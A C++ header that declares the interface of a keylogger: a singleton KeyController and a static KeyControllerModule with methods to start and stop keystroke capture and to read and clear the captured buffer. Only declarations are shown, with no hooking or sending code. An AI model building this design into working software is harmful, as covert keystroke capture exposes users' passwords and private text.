#pragma once
#include <string>

class KeyController {
public:
    static KeyController& getInstance();

	// start keylogging (auto spawns hook/thread/loop)
    bool startCapture();

	// stop keylogging
    bool stopCapture();

	// get buffer contents and clear internal buffer
    std::string getBufferAndClear();
private:
    KeyController();
    ~KeyController();
    KeyController(const KeyController&) = delete;
    KeyController& operator=(const KeyController&) = delete;

    struct Impl;
    Impl* pImpl;
};


class KeyControllerModule {
public:
    // start capturing keys (returns true if capture started)
    static bool start();

    // stop capturing keys (returns true if stopped successfully)
    static bool stop();

    // get buffer contents and clear internal buffer
    static std::string getBuffer();
};